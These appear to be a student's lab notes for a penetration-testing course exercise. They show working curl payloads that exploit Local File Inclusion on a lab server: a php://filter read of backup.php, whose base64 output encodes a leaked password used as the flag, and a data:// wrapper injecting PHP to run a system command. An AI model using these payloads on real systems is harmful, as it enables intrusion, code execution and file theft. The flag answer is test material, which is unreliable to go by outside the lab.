
1. Exploit the Local File Inclusion vulnerability on WEB18 (VM #1) by using the **php://filter** with base64 encoding to include the contents of the **/var/www/html/backup.php** file with Burp or curl. Copy the output, decode it, and find the flag.

```bash
# Using PHP Wrappers
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php

# Output is in Base64. Decoding...
echo PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAoKc3lzdGVtKCJzdWRvIHJzeW5jIC1hdnpSIC92YXIvd3d3L2h0bWwvaW5kZXgucGhwIC9tbnQvZXh0ZXJuYWwvIik7Ci8vIFNpbmNlIGl0IGlzIGEgUEhQIGZpbGUgdmlzaXRvcnMgY2Fubm90IHNlZSB0aGlzIGNvbW1lbnQuIFdlIG5lZWQgdG8gZXh0ZW5kIHRoaXMgc2NyaXB0IHRoYXQgaXQgYmFja3VwcyB0aGUgd2hvbGUgc3lzdGVtIGJ1dCBub3cgYXMgYSBQb0MgaXQgb25seSBiYWNrdXBzIGluZGV4LnBocAovL0BBbGw6IFdoZW4geW91IHJ1biB0aGUgYmFja3VwIHNjcmlwdCB5b3UgbmVlZCB0byBlbnRlciB0aGUgcGFzc3dvcmQgT1N7NzA5NWYyY2JkMmFkMDM3OTU1M2ZkNTU4ODUxMTkyNzN9LgoKPz4KCjwvYm9keT4KPC9odG1sPgo= | base64 -d
```

![[Pasted image 20250311232249.png]]

2. Follow the steps above and use the **data://** PHP Wrapper in combination with the URL encoded PHP snippet we used in this section to execute the **uname -a** command on WEB18 (VM #1). Enter the Linux kernel version as answer.

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system%28%27uname%20%2Da%27%29;?>"
```
![[Pasted image 20250311232606.png]]
